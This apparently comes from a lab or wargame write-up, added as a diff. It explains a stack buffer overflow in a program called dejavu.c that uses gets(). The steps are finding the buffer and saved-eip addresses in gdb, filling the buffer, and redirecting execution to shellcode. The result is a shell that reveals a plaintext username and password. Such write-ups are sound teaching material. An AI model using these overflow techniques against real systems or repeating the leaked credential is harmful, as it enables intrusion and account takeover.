@@ -1,0 +1,51 @@
+1. Behind the Scenes
+
+Vulnerability: In file dejavu.c, line 7, the use of 'gets' without checking size of input may result in overflow 'door'.
+
+Approach: overflow 'door' till the eip of the previous stack frame and overwrite the eip with the address to the shellcode.
+
+Attack:
+
+Step 1. Find address of 'door': Use gdb steppping over code lines until after 'door' is initialized, then type 'print &door[0]' to get 0xbffff948.
+
+Step 2. Identify the address of the eip of the previous frame: Type backtrace to get info about how many frames pushed up so far, type info frame 1 to expect the 'main' frame and see eip = 0x804842a as below:
+
+Stack frame at 0xbffff970:
+ eip = 0x804842a in main (dejavu.c:12); saved eip 0xb7e454d3
+ caller of frame at 0xbffff960
+ source language c.
+ Arglist at 0xbffff968, args: 
+ Locals at 0xbffff968, Previous frame's sp is 0xbffff970
+ Saved registers:
+  ebp at 0xbffff968, eip at 0xbffff96c
+
+This eip is the address of the next instruction to be executed.
+
+Step 3. Find the location of eip: type 'x/8xw 0xbffff948' to inspect the memory and find out that the eip lies at 0xbffff95c as below:
+
+0xbffff948:	0xbffffa0c	0xb7e5f225	0xb7fed270	0x00000000
+0xbffff958:	0xbffff968	0x0804842a	0x08048440	0x00000000
+                       ^     ^
+                       |     |
+                0xbffff95c  eip
+
+From above, 0x0804842a is at the location offset 4 bytes from 0xbffff958. So eip is at 0xbffff95c.
+
+Step 4. Fill 'door' with nonsense code from 0xbffff948 to 0xbffff95c. At 0xbffff95c, overwrite eip with 0xbffff960 that points to shellcode.
+
+0xbffff948:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff958:	0x6f6f6f6f	0xbffff960	0x895e1feb	0xc0310876
+                           ^       ^
+                           |       |
+                        new_eip   shellcode starts from here
+
+Result:
+
+vsftpd@pwnable:~$ invoke ./exploit
+whoami
+smith
+cat README
+Welcome to the real world.
+
+user: smith
+pass: f6g(Bz{w
